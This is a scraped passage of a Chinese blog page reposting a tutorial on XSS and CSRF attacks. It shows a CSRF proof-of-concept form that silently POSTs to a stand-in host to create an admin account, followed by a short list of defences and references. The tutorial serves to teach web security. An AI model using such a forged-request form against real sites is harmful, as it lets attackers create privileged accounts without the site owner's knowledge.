data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x22\x3c\x3c!DOCTYPE html\x3e\n\x3chtml\x3e\x3cbody\x3e\n  \x3cform action=\x26quot;http:\/\/xxx.com\/newUser.php\x26quot; method=\x26quot;POST\x26quot;\x3e\n    \x3cinput type=\x26quot;hidden\x26quot; name=\x26quot;name\x26quot; value=\x26quot;ro\x26quot;\x3e\n    \x3cinput type=\x26quot;hidden\x26quot; name=\x26quot;userrole\x26quot; value=\x26quot;admin\x26quot;\x3e\n    \x3cinput type=\x26quot;hidden\x26quot; name=\x26quot;password\x26quot; value=\x26quot;123456\x26quot;\x3e\n    \x3cinput type=\x26quot;hidden\x26quot; name=\x26quot;confirmpassword\x26quot; value=\x26quot;123456\x26quot;\x3e\n  \x3c\/form\x3e\n\x3c\/body\x3e\x3c\/html\x3e\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22hljs django\x22\x3e\x3ccode\x3e\x3cspan class=\x22xml\x22\x3e\x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x26lt;!\x3cspan class=\x22hljs-attr\x22\x3eDOCTYPE\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3ehtml\x3c\/span\x3e\x26gt;\x3c\/span\x3e\n\x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3ehtml\x3c\/span\x3e\x26gt;\x3c\/span\x3e\x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3ebody\x3c\/span\x3e\x26gt;\x3c\/span\x3e\n  \x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3eform\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3eaction\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22http:\/\/xxx.com\/newUser.php\x22\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3emethod\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22POST\x22\x3c\/span\x3e\x26gt;\x3c\/span\x3e\n    \x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3einput\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3etype\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22hidden\x22\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3ename\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22name\x22\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3evalue\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22ro\x22\x3c\/span\x3e\x26gt;\x3c\/span\x3e\n    \x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3einput\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3etype\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22hidden\x22\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3ename\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22userrole\x22\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3evalue\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22admin\x22\x3c\/span\x3e\x26gt;\x3c\/span\x3e\n    \x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3einput\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3etype\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22hidden\x22\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3ename\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22password\x22\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3evalue\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22123456\x22\x3c\/span\x3e\x26gt;\x3c\/span\x3e\n    \x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3einput\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3etype\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22hidden\x22\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3ename\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22confirmpassword\x22\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3evalue\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22123456\x22\x3c\/span\x3e\x26gt;\x3c\/span\x3e\n  \x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\/\x3cspan class=\x22hljs-name\x22\x3eform\x3c\/span\x3e\x26gt;\x3c\/span\x3e\n\x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\/\x3cspan class=\x22hljs-name\x22\x3ebody\x3c\/span\x3e\x26gt;\x3c\/span\x3e\x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\/\x3cspan class=\x22hljs-name\x22\x3ehtml\x3c\/span\x3e\x26gt;\x3c\/span\x3e\x3c\/span\x3e\x3c\/code\x3e\x3c\/pre\x3e\n\x3cp\x3e当管理员已经登陆的情况下，访问这个恶意网站的时候，就会提交这段脚本，管理员都不知情。因为管理员已经登陆，无需考虑 Cookie 的问题，一个简单的 CSRF 如此。\x3c\/p\x3e\n\x3ch2 id=\x22articleHeader7\x22\x3e总结\x3c\/h2\x3e\n\x3cp\x3e其实攻击很简单，主要的还是如何防御，比如\x3c\/p\x3e\n\x3col\x3e\n\x3cli\x3e\x3cp\x3e对一些关键字和特殊字符进行过滤或 URL、HTML 编码，\x22\x26lt;\x26gt;?\x22或\x22script，javascript\x22；\x3c\/p\x3e\x3c\/li\x3e\n\x3cli\x3e\x3cp\x3eCookie 防盗，在 Cookie 中防止放入用户名和密码，对 Cookie 信息进行 MD5 等算法进行多次散列存放，必要时还要对 ip 和 cookie 进行绑定，一旦检测异常，立马让用户重新登录；\x3c\/p\x3e\x3c\/li\x3e\n\x3cli\x3e\x3cp\x3e严格控制 URL 访问，对于一些挂马的 ip 和域名，强制无法访问；\x3c\/p\x3e\x3c\/li\x3e\n\x3cli\x3e\x3cp\x3e等等\x3c\/p\x3e\x3c\/li\x3e\n\x3c\/ol\x3e\n\x3cp\x3e共勉。\x3c\/p\x3e\n\x3ch2 id=\x22articleHeader8\x22\x3e参考\x3c\/h2\x3e\n\x3cblockquote\x3e\x3cp\x3e\x3ca href=\x22http:\/\/blog.csdn.net\/yefan2222\/article\/details\/7091863\x22 rel=\x22nofollow noreferrer\x22 target=\x22_blank\x22\x3e跨站脚本攻击介绍\x3c\/a\x3e\x3cbr\x3e\x3ca href=\x22https:\/\/wizardforcel.gitbooks.io\/xss-naxienian\/content\/7.html\x22 rel=\x22nofollow noreferrer\x22 target=\x22_blank\x22\x3e那些年我们一起学 XSS\x3c\/a\x3e\x3cbr\x3e\x3ca href=\x22https:\/\/blog.tonyseek.com\/post\/introduce-to-xss-and-csrf\/\x22 rel=\x22nofollow noreferrer\x22 target=\x22_blank\x22\x3e总结 XSS 与 CSRF 两种跨站攻击\x3c\/a\x3e\x3cbr\x3e书籍：《黑客攻防技术宝典 Web实战篇》\x3c\/p\x3e\x3c\/blockquote\x3e\n\x3cp\x3e欢迎来我\x3ca href=\x22http:\/\/yuren.space\x22 rel=\x22nofollow noreferrer\x22 target=\x22_blank\x22\x3e博客\x3c\/a\x3e交流。\x3c\/p\x3e\n\n                \n"
            html = html.replace(/"{/g, "{")
            html = html.replace(/{"/g, "{")
            html = html.replace(/"}/g, "}")
            html = html.replace(/}"/g, "}")
            $('#raw').html(html);

            let postTitle =  $('.posttitle').text()
            let postContentTitle =  $('#raw > h1').text()
            if(postTitle === postContentTitle){
                $('#raw > h1').hide()
            }
            $('button.preview').hide()
        })</script></div><h1 id="版权声明">版权声明</h1><p>本文资源来源互联网，仅供学习研究使用，版权归该资源的合法拥有者所有，</p><p>本文仅用于学习、研究和交流目的。转载请注明出处、完整链接以及原作者。</p><p>原作者若认为本站侵犯了您的版权，请联系我们，我们会立即删除！</p><h2 id="原文标题">原文标题</h2><p>XSS 和 CSRF 两种跨站攻击</p><h2 id="原文链接">原文链接</h2><p><a href="https://segmentfault.com/a/1190000007660669">https://segmentfault.com/a/1190000007660669</a></p><h2>本文链接：</h2><a href="https://alili.tech/archive/foopjzqqm5d/" target="_blank">https://alili.tech/archive/foopjzqqm5d/</a></div></article><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><div class="blog-post-comments"></div><script>new Valine({
        el: '.blog-post-comments', 
        app_id: 'ItyOVb4I33bTwprf3cY6uqMc-gzGzoHsz', 
        app_key: 'hLhtmd4tT0qJbyO2SgQ8odya', 
        placeholder: '说点什么?', 
        avatar:'robohash',
        notify:true,
        verify:true
    });</script><ul id="more-post-list" class="archive readmore"><h3>其他推荐</h3><li><a href="/archive/5x6tenwjeux/">ES6中的异步编程：Generators函数&#43;Promise:最强大的异步处理方式<aside class="dates">2019-01-31</aside></a></li><li><a href="/archive/nvtmua2a1hd/">GreenSock (TweenMax) 极简入门指南<aside class="dates">2019-01-31</aside></a></li><li><a href="/archive/7kt5s47oysx/">HTML5 中 canvas 的使用总结<aside class="dates">2019-01-31</aside></a></li><li><a href="/archive/41pgo3a2iyp/">JavaScript 开发者所需要知道的 V8（一）：V8 In NodeJS<aside class="dates">2019-01-31</aside></a></li><li><a href="/archive/krb1zm7x38j/">JavaScript 时间与日期处理实战:你肯定被坑过<aside class="dates">2019-01-31</aside></a></li><li><a href="/archive/yh2lq30d0x/">JavaScript中的各种宽高属性<aside class="dates">2019-01-31</aside></a></li><li><a href="/archive/eydwczesyv/">Muse UI — 基于 Vue2.0 的 Material Design UI 库<aside class="dates">2019-01-31</aside></a></li><li><a href="/archive/y62oejm8cr/">Nodejs基础：路径处理模块path总结<aside class="dates">2019-01-31</aside></a></li><li><a href="/archive/06cwh88ankmd/">PhantomJS &amp; NodeJS 在京东网站前端监控平台的最佳实践<aside class="dates">2019-01-31</aside></a></li><li><a href="/archive/z4ymvs0jz2h/">Promise 的链式调用与中止<aside class="dates">2019-01-31</aside></a></li></ul></section></div><footer id="footer"><div class="footer-left">Copyright © 2019 Fan <a href="http://www.miitbeian.gov.cn" rel="external nofollow noopener noreferrer" target="_blank">浙ICP备18045521号</a></div><div class="footer-right"><nav><ul><li><a href="/">Home</a></li><li><a href="/archive/">Archives</a></li><li><a href="/about/">About</a></li><li><a href="http://github.com/Fantasy9527" target="_blank">Github</a></li></ul></nav></div></footer><script src="https://alili.tech/lib/justified-gallery/jquery.justifiedGallery.min.js"></script><script src="https://alili.tech/lib/typed.js"></script><script src="https://alili.tech/js/main.js"></script><script async src=""></script><script>(function(){
  if(location.host!=='alili.tech')return;
  var ga = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  ga.src = 'https://www.googletagmanager.com/gtag/js?id=UA-129382678-1';       
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(ga, s);
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-129382678-1');
})()</script><script>(function(){
    if(location.host!=='alili.tech')return;
      var bp = document.createElement('script');
      var curProtocol = window.location.protocol.split(':')[0];
      if (curProtocol === 'https') {
          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
      }
      else {
          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
      }
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(bp, s);
  })();</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script>if ('serviceWorker' in navigator) {
      window.addEventListener('load', () => {
          navigator.serviceWorker
              .register('/sw.js')
              .then(registration => {
                  console.log('SW registered: ', registration);
              })
              .catch(registrationError => {
                  console.log('SW registration failed: ', registrationError);
              });
      });
  }</script></body></html>